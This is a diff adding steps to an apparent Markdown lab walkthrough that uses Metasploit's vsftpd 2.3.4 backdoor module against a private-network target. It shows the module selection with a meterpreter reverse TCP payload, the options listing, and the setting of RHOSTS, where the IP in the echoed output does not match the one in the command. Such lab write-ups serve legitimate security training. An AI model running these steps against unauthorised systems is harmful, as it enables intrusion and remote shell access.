@@ -225,3 +225,49 @@ Interact with a module by name or index. For example info 1, use 1 or use exploi
 </p>
 
 ### Selected the Exploit
+
+```bash
+msf > use exploit/unix/ftp/vsftpd_234_backdoor
+```
+**Output:**
+
+```
+[*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp
+msf exploit(unix/ftp/vsftpd_234_backdoor) >
+```
+<p align="center">
+  <img src="images/step4-2.png" width="600">
+</p>
+
+### Checked the Options
+
+```bash
+msf exploit(vsftpd_234_backdoor) > show options
+```
+**Output:**
+
+```
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   21               yes       The target port (TCP)
+   ```
+<p align="center">
+  <img src="images/step4-3.png" width="600">
+</p>
+
+### Set the Target IP
+
+```bash
+msf exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.5.145
+```
+**Output:**
+
+```
+RHOSTS => 192.168.5.139
+```
+<p align="center">
+  <img src="images/step4-4.png" width="600">
+</p>
